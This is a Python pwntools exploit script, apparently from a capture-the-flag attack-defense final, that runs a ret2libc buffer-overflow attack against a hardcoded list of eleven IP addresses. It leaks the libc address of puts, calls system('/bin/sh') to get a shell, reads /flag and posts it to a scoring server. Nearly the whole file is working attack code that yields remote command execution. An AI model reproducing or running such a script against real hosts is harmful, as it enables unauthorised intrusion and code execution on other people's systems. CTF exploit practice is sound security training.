#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: ByamB4

from pwn import *
from requests import post


exe = context.binary = ELF('pwn', checksec=False)

libc = ELF("./libc.so", checksec=False)

TARGETS = ['18.163.124.161', '18.162.229.52', '18.162.213.160', '18.166.225.82', '16.162.121.56',
           '18.162.213.70', '18.163.191.225', '18.166.29.174', '18.167.20.149', '18.162.113.173', '18.162.52.48']
HEADERS = {
    'Authorization': "<YOURAUTHTOKEN>"
}

for host in TARGETS:
    port = int(args.PORT or 13302)
    try:

        def start_local(argv=[], *a, **kw):
            if args.GDB:
                return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
            else:
                return process([exe.path] + argv, *a, **kw)

        def start_remote(argv=[], *a, **kw):
            io = connect(host, port)
            if args.GDB:
                gdb.attach(io, gdbscript=gdbscript)
            return io

        def start(argv=[], *a, **kw):
            if args.LOCAL:
                return start_local(argv, *a, **kw)
            else:
                return start_remote(argv, *a, **kw)

        puts_got = p64(exe.got.puts)
        puts_plt = p64(exe.plt.puts)
        main_plt = p64(exe.symbols.main + 1)
        padding = b'\x90' * 56
        pop_rdi = p64(0x400d83)

        PAYLOAD = padding + pop_rdi + puts_got + puts_plt + main_plt
        io = start()

        io.sendline('5')

        io.sendline(PAYLOAD)
        io.recvline()
        io.recvline()
        io.recvline()
        io.recvline()
        io.recvline()

        puts_leaked = u64(io.recvline().strip().ljust(8, b'\x00'))

        # print(f'[+] Leak: {hex(puts_leaked)}')

        puts_offset = libc.symbols.puts
        libc_base = puts_leaked - puts_offset
        # print("LIBC Base : ",hex(libc_base))
        system_offset = libc.symbols.system
        binsh_offset = next(libc.search(b"/bin/sh"))
        exit_offset = libc.symbols.exit

        system = p64(libc_base + system_offset)
        binsh = p64(libc_base + binsh_offset)
        exit = p64(libc_base + exit_offset)

        PAYLOAD = padding + pop_rdi + binsh + system
        # print('payload', PAYLOAD)

        io.sendline('5')
        io.recv()
        # io.recv()
        io.sendline(PAYLOAD)

        io.recv()
        io.sendline(b'cat /flag')
        flag = io.recv()
        print(f'[+] Flag({_}): {flag.decode()}')
        io.close()

        resp = post('http://final.haruulzangi.mn:19999/api/flag', json={
            'flag': flag}, headers=HEADERS)
        print(f'[*] Response: {resp.text}')

    except Exception as e:
        print(f'[-] Error: {e}')
